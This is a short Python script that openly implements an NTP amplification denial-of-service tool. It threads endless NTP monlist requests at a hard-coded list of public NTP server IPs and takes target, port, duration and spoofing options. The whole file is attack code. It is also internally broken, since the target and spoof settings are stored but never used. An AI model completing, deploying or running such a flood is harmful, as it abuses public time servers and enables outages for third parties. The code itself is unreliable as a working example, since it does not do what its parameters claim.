import socket
import struct
import random
import threading
import time

NTP_SERVERS = [
    "162.159.200.123", "216.239.35.0", "129.6.15.28",
    "129.6.15.29", "132.163.96.1", "132.163.96.2",
]

class NTPAmplification:
    def __init__(self, target, port, threads, duration, spoof=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.spoof = spoof
        self.stop_event = threading.Event()

    def _build_ntp_monlist(self):
        # NTP monlist request
        packet = b'\x17\x00\x03\x2a' + b'\x00' * 44
        return packet

    def _send_ntp(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        query = self._build_ntp_monlist()
        while not self.stop_event.is_set():
            for ntp in NTP_SERVERS:
                try:
                    sock.sendto(query, (ntp, 123))
                except Exception:
                    pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._send_ntp)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False):
    flood = NTPAmplification(target, port, threads, duration, spoof)
    flood.start()
